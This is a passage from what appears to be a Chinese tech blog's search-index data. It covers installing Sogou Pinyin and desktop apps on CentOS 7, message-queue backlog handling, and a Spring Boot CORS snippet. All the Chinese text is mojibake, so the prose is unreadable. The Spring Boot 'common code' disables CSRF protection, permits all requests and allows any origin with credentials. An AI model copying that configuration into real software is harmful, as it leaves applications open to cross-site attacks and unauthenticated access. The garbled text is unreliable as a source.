navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Centos7 å®‰è£…æœç‹—è¾“å…¥æ³•",url:"/posts/26aba73.html",text:'å‰è¨€ æœ¬æ•™ç¨‹åªé€‚ç”¨äº Centos7 å®‰è£…æœç‹—è¾“å…¥æ³•ï¼ˆv2.2.0.0108ï¼‰ï¼Œæ”¯æŒçš„æ¡Œé¢ç¯å¢ƒæ˜¯ GNOMEã€‚æ³¨ï¼šæ–‡ç« æœ«å°¾é™„æœ‰æœç‹—è¾“å…¥æ³•æœ€ç»ˆçš„è¿è¡Œæ•ˆæœå›¾ ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å®‰è£… Fcitx è¾“å…¥æ³•æ¡†æ¶ 12345678910111213141516171819202122# å…³é—­ibusè¾“å…¥æ³•ï¼Œç»å¯¹ä¸èƒ½ä½¿ç”¨â€œyum remove ibusâ€å‘½ä»¤å¸è½½ibus, å¦åˆ™ä¼šå°†æ¡Œé¢ç¯å¢ƒä¸€åŒå¸è½½æ‰# mv /usr/bin/ibus-daemon /usr/bin/ibus-daemon.bak# å®‰è£…fcitx# yum install libQtWebKit* fcitx fcitx-libs fcitx-qt4 fcitx-qt5 fcitx-configtool fcitx-table fcitx-table-chinese# å¦‚æœä¸Šé¢çš„fcitx-qt5å› ä¾èµ–å…³ç³»æ— æ³•å®‰è£…ï¼Œåˆ™å¯ä»¥å®‰è£…qt5-qtbaseæ¥æ›¿ä»£# yum install qt5-qtbase# é…ç½®ç¯å¢ƒå˜é‡ï¼ˆä¸»è¦æ˜¯ä¸ºäº†è§£å†³GTK/Qtç¨‹åºæ— æ³•åˆ‡æ¢è¾“å…¥æ³•ï¼‰# vim /etc/profileexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# é‡å¯ç³»ç»Ÿä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆï¼Œå¹¶å…³é—­ibus# reboot# æŸ¥çœ‹fcitxçš„å®‰è£…çŠ¶æ€ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ï¼Œé‡ç‚¹æŸ¥çœ‹çº¢è‰²éƒ¨åˆ†ï¼ˆé”™è¯¯ï¼‰çš„æ—¥å¿—ä¿¡æ¯$ fcitx-diagnose å®‰è£…æœç‹—è¾“å…¥æ³• 12345678910111213141516171819202122232425262728# å®‰è£…alien# yum install alien# ä¸‹è½½debåŒ…# wget http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=EPtVkvlW9rLVsn-jtfOGbA&amp;e=1568569239&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb# è½¬æ¢rpmåŒ…# alien -r sogoupinyin_2.2.0.0108_amd64.deb# å®‰è£…æœç‹—è¾“å…¥æ³•# rpm -ivh --force sogoupinyin-2.2.0.0108-2.x86_64.rpm# æ‹·è´åº“æ–‡ä»¶# cp -R /usr/lib/x86_64-linux-gnu/fcitx/* /usr/lib64/fcitx/# åº“æ–‡ä»¶æˆæƒ# chmod -R 755 /usr/lib64/fcitx/# å¯åŠ¨fcitx$ fcitx# å¼€æœºè‡ªå¯åŠ¨fcitx# å¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; ä¼˜åŒ–å·¥å…· --&gt; å¼€æœºå¯åŠ¨ç¨‹åºï¼Œè®¾ç½®fcitxä¸ºå¼€æœºè‡ªå¯åŠ¨# é…ç½®fcitxï¼Œæ·»åŠ æœç‹—è¾“å…¥æ³•$ fcitx-configtool# æç¤ºï¼šfcitxæˆåŠŸæ·»åŠ æœç‹—è¾“å…¥æ³•åï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥é€šè¿‡å¿«æ·é”®ctrl + ç©ºæ ¼è°ƒå‡ºæœç‹—è¾“å…¥æ³• (adsbygoogle = window.adsbygoogle || []).push({}); è§£å†³æœç‹—è¾“å…¥æ³•æ— æ³•è¿è¡Œæˆ–è€…åˆ‡æ¢å¤±è´¥çš„é—®é¢˜ 1234567891011121314# ä¸€èˆ¬æ˜¯sogou-qimpanelå¯åŠ¨å¤±è´¥å¯¼è‡´ï¼Œé¦–å…ˆåˆ é™¤æœç‹—è¾“å…¥æ³•çš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œç„¶åé‡å¯æœç‹—è¾“å…¥æ³•æˆ–è€…é‡å¯ç³»ç»Ÿ$ rm -rf ~/.config/SogouPY$ rm -rf ~/.config/SogouPY.users$ rm -rf ~/.config/sogou-qimpanel# é‡å¯fcitxä¸æœç‹—è¾“å…¥æ³•ï¼ˆæ€æ­»ä¸‹é¢çš„åº”ç”¨è¿›ç¨‹åï¼Œç”±äºå­˜åœ¨å®ˆæŠ¤è¿›ç¨‹çš„ç¼˜æ•…ï¼Œåº”ç”¨è¿›ç¨‹ä¼šè‡ªåŠ¨é‡å¯ï¼‰$ killall fcitx$ killall sogou-qimpanel# å¦‚æœæœç‹—è¾“å…¥æ³•è¿˜æ˜¯æ— æ³•æ­£å¸¸è¿è¡Œï¼Œå°è¯•è®¾ç½®GNOMEçš„æ³¨å†Œè¡¨ï¼ˆæˆ–è€…ä½¿ç”¨dconf-editorå¯è§†åŒ–å·¥å…·æ¥è®¾ç½®æ³¨å†Œè¡¨ï¼‰ï¼Œè®¾ç½®å®Œä¹‹åé‡å¯ç³»ç»Ÿ$ gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½æ— æ³•è§£å†³ï¼Œé‚£ä¹ˆå¯æŸ¥çœ‹fcitxçš„é”™è¯¯æ—¥å¿—ä¿¡æ¯æ¥æ’æŸ¥é—®é¢˜$ cat ~/.config/fcitx/log/crash.log å®‰è£…å…¶ä»–è¾“å…¥æ³•ï¼ˆå¯é€‰æ“ä½œï¼ŒæœªéªŒè¯ï¼‰ 1234567891011# æ ‡å‡†æ‹¼éŸ³è¾“å…¥æ³•# yum install fcitx-pinyin# ä¸­å·éŸµè¾“å…¥æ³•# yum install fcitx-rime fcitx-cloudpinyin# è°·æ­Œæ‹¼éŸ³è¾“å…¥æ³•# yum install fcitx-googlepinyin fcitx-cloudpinyin# sunpinyinè¾“å…¥æ³•# yum install fcitx-sunpinyin sunpinyin-data fcitx-cloudpinyin æ–°å¢è¾“å…¥æ³•çš„çš®è‚¤ï¼ˆå¯é€‰æ“ä½œï¼‰ 12345678910111213# fcitxç»å…¸çš®è‚¤çš„ç›®å½•è·¯å¾„# /usr/share/fcitx/skin# ~/.config/fcitx/skin# sogou-qimpanelçš®è‚¤çš„ç›®å½•è·¯å¾„# /usr/share/sogou-qimpanel/skin# æœç‹—å…¨å¹³å°é€šç”¨ssfæ ¼å¼çš®è‚¤çš„ç›®å½•è·¯å¾„# /usr/share/sogou-qimpanel/recommendSkin/skin# ~/.config/sogou-qimpanel/skin# æœç‹—è¾“å…¥æ³•çš®è‚¤ä¸‹è½½ï¼šhttps://pinyin.sogou.com/skins/# æç¤ºï¼šå¯ä»æœç‹—è¾“å…¥æ³•å®˜ç½‘ä¸‹è½½æ–°çš®è‚¤åˆ°ä¸Šè¿°å¯¹åº”çš„ç›®å½•ä¸‹ï¼ˆåŒºåˆ†Linuxç”¨æˆ·ï¼‰ï¼Œç›®å‰éUbuntuç³»çš„Linuxå‘è¡Œç‰ˆè·Ÿæœç‹—è¾“å…¥æ³•çš„çš®è‚¤(sffæ ¼å¼)ä¸å…¼å®¹ï¼Œå®æµ‹Centos7æ— æ³•æ­£å¸¸ä½¿ç”¨æœç‹—è¾“å…¥æ³•çš„çš®è‚¤å®‰è£…åŠŸèƒ½ æ–°å¢æœç‹—è¾“å…¥æ³•è¯åº“ï¼ˆå¯é€‰æ“ä½œï¼‰ 123456789101112131415161718192021# ä¸‹è½½è¯åº“ï¼ˆhttps://pinyin.sogou.com/dict/ï¼‰$ wget http://download.pinyin.sogou.com/dict/download_cell.php?id=22408&amp;name=ç”µè§†å‰§åå¤§å…¨# æ‹·è´è¯åº“æ–‡ä»¶$ cp ç”µè§†å‰§åå¤§å…¨.scel ~/.config/SogouPY/scd# é‡å‘½åè¯åº“æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºï¼šæ•°å­—.scel$ mv ~/.config/SogouPY/scd/ç”µè§†å‰§åå¤§å…¨.scel ~/.config/SogouPY/scd/15279.scel# ç¼–è¾‘è¯åº“é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆå…¶ä¸­scdçš„åºå·å¿…é¡»å”¯ä¸€ï¼Œidå¿…é¡»ä¸è¯åº“çš„æ–‡ä»¶åä¸€è‡´ï¼‰$ vim ~/.config/SogouPY/scdlist.ini[scd4]id=15279name=ç”µè§†å‰§åå¤§å…¨type=ç”µè§†å‰§åå¤§å…¨# é‡å¯fcitxä¸æœç‹—è¾“å…¥æ³•ï¼ˆæ€æ­»ä¸‹é¢çš„åº”ç”¨è¿›ç¨‹åï¼Œç”±äºå­˜åœ¨å®ˆæŠ¤è¿›ç¨‹çš„ç¼˜æ•…ï¼Œåº”ç”¨è¿›ç¨‹ä¼šè‡ªåŠ¨é‡å¯ï¼‰$ killall fcitx$ killall sogou-qimpanel# å¯¼èˆªåˆ°æœç‹—è¾“å…¥æ³• --&gt; è®¾ç½® --&gt; è¯åº“ï¼Œå¦‚æœæˆåŠŸæ·»åŠ è¯åº“ï¼Œé‚£ä¹ˆç•Œé¢ä¸Šä¼šæ˜¾ç¤ºæ–°æ·»åŠ çš„è¯åº“ç±»å‹ ä½¿ç”¨ im-chooser åˆ‡æ¢è¾“å…¥æ³•ï¼ˆå¯é€‰æ“ä½œï¼Œä¸å»ºè®®ï¼‰ 12345678910111213# ä»…ä¾›å‚è€ƒï¼Œäº²æµ‹Centos7ç¯å¢ƒä¸‹ä¸ä¸€å®šèƒ½ä¿è¯åˆ‡æ¢æˆåŠŸï¼›å½“fcitxå®‰è£…æˆåŠŸï¼Œå¹¶æ·»åŠ äº†æœç‹—è¾“å…¥æ³•ï¼Œé‚£ä¹ˆæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥é€šè¿‡å¿«æ·é”®ctrl + shiftæ¥åˆ‡æ¢ä¸åŒçš„è¾“å…¥æ³•# å®‰è£…im-chooser# yum install im-chooser# åˆ‡æ¢è¾“å…¥æ³•ä¸ºfcitx$ imsettings-switch fcitx# å¦‚æœæ— æ³•åˆ‡æ¢è‡³æŒ‡å®šçš„è¾“å…¥æ³•ï¼Œå¯ä»¥æŸ¥çœ‹imsettingsçš„æ—¥å¿—æ¥æ’æŸ¥é—®é¢˜$ cat ~/.cache/imsettings/log# æ£€æŸ¥imsettingsè®¾ç½®$ imsettings-info æœ€ç»ˆæ•ˆæœå›¾ å‚è€ƒåšå®¢ Centos7.2 å®‰è£…æœç‹—æ‹¼éŸ³ Sogou Pinyin å®‰è£…è¿‡ç¨‹å¸¸è§çš„é—®é¢˜ CentOS 7 è¾“å…¥ä¸­æ–‡ &amp; å®‰è£…æœç‹—è¾“å…¥æ³• Fedora20 å®‰è£…æœç‹—è¾“å…¥æ³•åŠå„ç§é—®é¢˜çš„è§£å†³ Fedora 29/30 å®‰è£… FCITX è¾“å…¥æ³• + Rime / æ‹¼éŸ³ é Ubuntu ç³»å‘è¡Œç‰ˆè·Ÿæœç‹—è¾“å…¥æ³•çš„çš®è‚¤ä¸å…¼å®¹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"æ¶ˆæ¯é˜Ÿåˆ—é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/f7fd0987.html",text:'æ¶ˆæ¯ç§¯å‹æ¶ˆæ¯ç§¯å‹æ¦‚è¿°æ¶ˆæ¯çš„ç§¯å‹æ¥è‡ªäºä¸¤æ–¹é¢ï¼šè¦ä¹ˆå‘é€å¿«äº†ï¼Œè¦ä¹ˆæ¶ˆè´¹å˜æ…¢äº† ç›‘æ§å‘ç°ï¼Œç”Ÿäº§å’Œæ¶ˆè´¹æ¶ˆæ¯çš„é€Ÿåº¦æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œå‡ºç°æ¶ˆæ¯ç§¯å‹çš„æƒ…å†µï¼Œæ£€æŸ¥æ˜¯æœ‰æ¶ˆè´¹å¤±è´¥åå¤æ¶ˆè´¹çš„æƒ…å†µã€‚ ç›‘æ§å‘ç°ï¼Œæ¶ˆè´¹æ¶ˆæ¯çš„é€Ÿåº¦å˜æ…¢ï¼Œæ£€æŸ¥æ¶ˆè´¹å®ä¾‹ï¼Œæ—¥å¿—ä¸­æ˜¯å¦æœ‰å¤§é‡æ¶ˆè´¹é”™è¯¯ã€æ¶ˆè´¹çº¿ç¨‹æ˜¯å¦æ­»é”ã€æ˜¯å¦å¡åœ¨æŸäº›èµ„æºä¸Šã€‚ å•ä½æ—¶é—´å†…å‘é€çš„æ¶ˆæ¯å¢å¤šï¼Œæ¯”å¦‚èµ¶ä¸Šå¤§ä¿ƒæˆ–è€…æŠ¢è´­ï¼ŒçŸ­æ—¶é—´å†…ä¸å¤ªå¯èƒ½ä¼˜åŒ–æ¶ˆè´¹ç«¯çš„ä»£ç æ¥æå‡æ¶ˆè´¹æ€§èƒ½ï¼Œä½†å¯ä»¥é€šè¿‡æ‰©å®¹æ¶ˆè´¹ç«¯çš„å®ä¾‹æ•°æ¥æå‡æ€»ä½“çš„æ¶ˆè´¹èƒ½åŠ›ã€‚ å¦‚æœçŸ­æ—¶é—´å†…æ²¡æœ‰æœåŠ¡å™¨èµ„æºæ‰©å®¹ï¼Œå¯ä»¥å°†ç³»ç»Ÿé™çº§ï¼Œé€šè¿‡å…³é—­æŸäº›ä¸é‡è¦çš„ä¸šåŠ¡ï¼Œå‡å°‘æ¶ˆæ¯å‘é€çš„æ•°æ®é‡ï¼Œæœ€ä½é™åº¦è®©ç³»ç»Ÿè¿˜èƒ½æ­£å¸¸è¿è½¬ï¼Œä¿è¯æ ¸å¿ƒä¸šåŠ¡çš„å¯ç”¨æ€§ã€‚ ä¸¥é‡å½±å“ QM ç”šè‡³æ•´ä¸ªç³»ç»Ÿæ—¶ï¼Œå¯ä»¥è€ƒè™‘ä¸´æ—¶å¯ç”¨å¤šä¸ªæ¶ˆè´¹è€…ï¼Œå¹¶å‘æ¥å—æ¶ˆæ¯ï¼ŒæŒä¹…åŒ–ä¹‹åå›å¤´è®©ç”Ÿäº§è€…é‡æ–°ç”Ÿäº§æ¶ˆæ¯ï¼Œæˆ–è€…æç«¯æƒ…å†µä¸‹ç›´æ¥ä¸¢å¼ƒæ¶ˆæ¯ã€‚ æ¶ˆæ¯ç§¯å‹æ‰©å®¹æ–¹æ¡ˆåˆ©ç”¨ä¸´æ—¶æ¶ˆè´¹è€…ï¼Œæ¶ˆè´¹åŸæ¥ç§¯å‹é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ã€‚è¯¥æ¶ˆè´¹è€…ä¸åšä»»ä½•è€—æ—¶çš„æ“ä½œï¼Œå°†æ¶ˆæ¯å‡åŒ€å†™å…¥æ–°åˆ›å»ºçš„é˜Ÿåˆ—é‡Œï¼Œæœ€åå°†æ›´å¤š Consumer éƒ¨ç½²åˆ°æ›´å¤šçš„æœºå™¨ä¸Šæ¶ˆè´¹æ–°åˆ›å»ºé˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯ã€‚ç­‰å¾…ç§¯å‹çš„æ¶ˆæ¯è¢«æ¶ˆè´¹ï¼Œæ¢å¤åˆ°æ­£å¸¸çŠ¶æ€ï¼Œæ’¤æ‰æ‰©å®¹æœåŠ¡å™¨ã€‚å…·ä½“æ­¥éª¤å’Œæ€è·¯å¦‚ä¸‹ï¼š å…ˆä¿®å¤ Consumer çš„é—®é¢˜ï¼Œç¡®ä¿å…¶æ¢å¤æ­£å¸¸çš„æ¶ˆè´¹é€Ÿåº¦ï¼Œç„¶åå°†ç°æœ‰ Consumer éƒ½åœæ­¢ ä¸´æ—¶å»ºç«‹å¥½åŸå…ˆ 10 å€æˆ–è€… 20 å€çš„ Queue æ•°é‡ å†™ä¸€ä¸ªä¸´æ—¶çš„åˆ†å‘æ•°æ®çš„ Consumer ç¨‹åºï¼Œè¿™ä¸ªç¨‹åºéƒ¨ç½²ä¸Šå»æ¶ˆè´¹ç§¯å‹çš„æ•°æ®ï¼Œæ¶ˆè´¹ä¹‹åä¸åšè€—æ—¶çš„å¤„ç†ï¼Œç›´æ¥å‡åŒ€è½®è¯¢å†™å…¥ä¸´æ—¶å»ºç«‹å¥½çš„ 10 å€æ•°é‡çš„ Queue æ¥ç€ä¸´æ—¶å¾ç”¨ 10 å€æœºå™¨æ¥éƒ¨ç½² Consumerï¼Œæ¯ä¸€æ‰¹ Consumer æ¶ˆè´¹ä¸€ä¸ªä¸´æ—¶ Queue çš„æ•°æ® è¿™ç§åšæ³•ç›¸å½“äºä¸´æ—¶å°† Queue èµ„æºå’Œ Consumer èµ„æºæ‰©å¤§äº† 10 å€ï¼Œå³ä»¥æ­£å¸¸çš„ 10 å€é€Ÿåº¦æ¶ˆè´¹ç§¯å‹çš„æ¶ˆæ¯ï¼Œæ‰©å®¹å‰åå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ¶ˆæ¯ç§¯å‹çœŸå®åœºæ™¯åœºæ™¯ä¸€ï¼šå¤§é‡æ¶ˆæ¯ç§¯å‹ï¼Œå¹¶ä¸”è®¾ç½®äº†è¿‡æœŸæ—¶é—´ å‡è®¾ç”¨çš„æ˜¯ RabbitMQï¼Œç”±äº RabbitMQ æ˜¯å¯ä»¥è®¾ç½®è¿‡æœŸæ—¶é—´çš„ï¼ˆTTLï¼‰ï¼Œå¦‚æœæ¶ˆæ¯åœ¨ Queue ä¸­ç§¯å‹è¶…è¿‡ä¸€å®šçš„æ—¶é—´ï¼Œå°±ä¼šè¢« RabbitMQ æ¸…ç†æ‰ã€‚è¿™ä¸ªæ—¶å€™å°±ä¸æ˜¯æ¶ˆæ¯è¢«å¤§é‡ç§¯å‹çš„é—®é¢˜ï¼Œè€Œæ˜¯å¤§é‡çš„æ¶ˆæ¯è¢«ç›´æ¥æä¸¢äº†ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå°±ä¸æ˜¯è¯´è¦å¢åŠ  Consumer æ¶ˆè´¹ç§¯å‹çš„æ¶ˆæ¯ï¼Œå› ä¸ºå®é™…ä¸Šæ¶ˆæ¯æ˜¯æ²¡æœ‰ç§¯å‹çš„ï¼Œè€Œæ˜¯ä¸¢äº†å¤§é‡çš„æ¶ˆæ¯ï¼Œæ­¤æ—¶å¯ä»¥é‡‡å–çš„ä¸€ä¸ªæ–¹æ¡ˆå°±æ˜¯æ‰¹é‡é‡å¯¼ã€‚å½“å¤§é‡çš„æ¶ˆæ¯ç§¯å‹çš„æ—¶å€™ï¼Œç”±äºè®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼ŒRabbitMQ ä¼šç›´æ¥ä¸¢å¼ƒæ•°æ®ï¼Œç„¶åç­‰ä¸šåŠ¡é«˜å³°æœŸè¿‡äº†ä¹‹åï¼Œä¾‹å¦‚åœ¨æ™šä¸Š 12 ç‚¹ä»¥åï¼Œå†™ä¸ªä¸´æ—¶ç¨‹åºå°†ä¸¢å¤±çš„é‚£æ‰¹æ•°æ®æŸ¥è¯¢å‡ºæ¥ï¼Œç„¶åé‡æ–°å°†æ¶ˆæ¯å†™å…¥ RabbitMQ é‡Œï¼Œå³æŠŠç™½å¤©ä¸¢çš„æ¶ˆæ¯å…¨éƒ¨è¡¥å›æ¥ã€‚å‡è®¾ 10000 ä¸ªè®¢å•ç§¯å‹åœ¨ RabbitMQ é‡Œé¢ï¼Œæ²¡æœ‰æ¥å¾—åŠå¤„ç†æ‰ï¼Œå…¶ä¸­ 2000 ä¸ªè®¢å•éƒ½ä¸¢äº†ï¼Œé‚£ä¹ˆåªèƒ½æ‰‹åŠ¨å†™ä¸ªä¸´æ—¶ç¨‹åºæŠŠé‚£ 2000 ä¸ªè®¢å•æŸ¥è¯¢å‡ºæ¥ï¼Œç„¶åæ‰‹åŠ¨å‘é€æ¶ˆæ¯åˆ° RabbitMQ ä¸­é‡æ–°è¿›è¡Œæ¶ˆè´¹ã€‚ åœºæ™¯äºŒï¼šå¤§é‡æ¶ˆæ¯ç§¯å‹ï¼Œå¯¼è‡´ MQ ç£ç›˜æ»¡äº† æ¶ˆæ¯ç§¯å‹åœ¨ MQ é‡Œï¼Œé‚£ä¹ˆå¦‚æœå¾ˆé•¿æ—¶é—´éƒ½æ²¡æœ‰å¤„ç†æ‰ï¼Œæ­¤æ—¶å¯¼è‡´ MQ éƒ½å¿«å†™æ»¡äº†ï¼Œé‚£åº”è¯¥æ€ä¹ˆåŠï¼Ÿè¿™ä¸ªæ—¶å€™å¯ä»¥å†™ä¸€ä¸ªä¸´æ—¶ç¨‹åºï¼Œå¯ç”¨å¤šä¸ªæ¶ˆè´¹è€…ï¼Œå¹¶å‘æ¥å—æ¶ˆæ¯ï¼ŒåŒæ—¶æŒä¹…åŒ–æ¶ˆæ¯ï¼Œå³å¿«é€Ÿæ¶ˆè´¹æ‰ MQ ä¸­ç§¯å‹çš„æ¶ˆæ¯ã€‚åˆ°å‡Œæ™¨çš„æ—¶å€™ï¼Œå°†æŒä¹…åŒ–çš„æ¶ˆæ¯é‡æ–°å†™å› MQ ä¸­è¿›è¡Œæ¶ˆè´¹ï¼›å¦‚æœå¸Œæœ›åŠ å¿«å·²æŒä¹…åŒ–æ¶ˆæ¯çš„æ¶ˆè´¹é€Ÿåº¦ï¼Œå¯ä»¥å¼•å…¥ä¸Šè¿°çš„æ¶ˆæ¯ç§¯å‹æ‰©å®¹æ–¹æ¡ˆã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"SpringBoot å¸¸ç”¨ä»£ç å—",url:"/posts/f023325d.html",text:'è·¨åŸŸSpringBoot + Security è·¨åŸŸ12345678910111213141516171819202122232425262728293031323334353637import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.security.config.annotation.web.builders.HttpSecurity;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;/** * Web å®‰å…¨é…ç½® */@Configurationpublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and().csrf().disable().authorizeRequests().antMatchers("/**").permitAll(); } /** * å…è®¸è·¨åŸŸ * * @return */ @Bean public CorsFilter corsFilter() { UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOrigin("*"); corsConfiguration.addAllowedHeader("*"); corsConfiguration.addAllowedMethod("*"); corsConfiguration.setAllowCredentials(true); source.registerCorsConfiguration("/**", corsConfiguration); return new CorsFilter(source); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¼€å‘éšç¬”"},{title:"Centos7 å®‰è£…å¸¸ç”¨æ¡Œé¢è½¯ä»¶",url:"/posts/3f15d076.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç» Centos7 å¦‚ä½•å®‰è£…å¾®ä¿¡å®¢æˆ·ç«¯ã€ç½‘æ˜“äº‘éŸ³ä¹ã€ç™¾åº¦ç½‘ç›˜ã€TeamViewerã€Rhythmbox ç­‰æ¡Œé¢è½¯ä»¶ã€‚ æ·»åŠ  YUM æº æ·»åŠ  epelï¼Œnux-dextopï¼Œrpmfusion æºï¼Œå¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ï¼šCentos7 ç®¡ç† YUM æº electronic-wechat å¾®ä¿¡å®¢æˆ·ç«¯ electronic-wechat æ˜¯ä¸€æ¬¾åŸºäº Web ç‰ˆå¾®ä¿¡å¼€å‘çš„ç¬¬ä¸‰æ–¹å¾®ä¿¡å®¢æˆ·ç«¯ï¼Œè‡ªå¸¦æ¶ˆæ¯é˜²æ’‡å›åŠŸèƒ½ã€‚ç”±äº Web ç‰ˆçš„å¾®ä¿¡ä¼šé™åˆ¶æ–°æ³¨å†Œçš„å¾®ä¿¡è´¦å·ç™»å½•ï¼Œå› æ­¤ electronic-wechat åŒæ ·ä¸æ”¯æŒå¾®ä¿¡æ–°è´¦å·ç™»å½•ã€‚è¯¥é¡¹ç›®ç”±äºå„ç§åŸå› å·²ç»åœæ­¢ç»´æŠ¤ï¼Œä½†å¹¶ä¸å½±å“æ­£å¸¸ä½¿ç”¨ï¼Œå®æµ‹ä½¿ç”¨éå¸¸ç¨³å®šã€‚ electronic-wechat github electronic-wechat releases 123456789101112131415161718192021222324252627282930# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local# ä¸‹è½½å·²ç¼–è¯‘çš„å®‰è£…åŒ…$ wget https://github.com/kooritea/electronic-wechat/releases/download/v2.3.1/electronic-wechat-linux-x64-2.3.1.zip# è§£å‹æ–‡ä»¶# unzip electronic-wechat-linux-x64-2.3.1.zip# åˆ é™¤æ–‡ä»¶# rm -rf electronic-wechat-linux-x64-2.3.1.zip# æ–‡ä»¶æˆæƒ# chown -R peter:peter electronic-wechat-linux-x64# ä½¿ç”¨æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œåº”ç”¨ï¼ˆå¯ä»¥ä½¿ç”¨å¿«æ·é”®ctrl + cé€€å‡ºç¨‹åºï¼‰$ ./electronic-wechat-linux-x64/electronic-wechat# åˆ›å»ºåº”ç”¨èœå•æ çš„å¿«æ·æ–¹å¼# vim /usr/share/applications/electronic-wechat.desktop[Desktop Entry]Name=Electronic WechatComment=Unofficial WeChat client built with React, MobX and Electron.Exec=/usr/local/electronic-wechat-linux-x64/electronic-wechat %UIcon=/usr/local/electronic-wechat-linux-x64/assets/icon.pngTerminal=falseType=ApplicationCategories=Network;Chat;# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; äº’è”ç½‘ --&gt; Electronic Wechatï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œæ•ˆæœå›¾å¦‚ä¸‹ (adsbygoogle = window.adsbygoogle || []).push({}); ç½‘æ˜“äº‘éŸ³ä¹ å»ºè®®ç›´æ¥ä½¿ç”¨ Snap æˆ–è€… Flatpak å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹ï¼Œç½‘ä¸Šè§£å‹ deb åŒ…çš„å®‰è£…æ–¹æ³•å¤§å¤šæ•°æ— 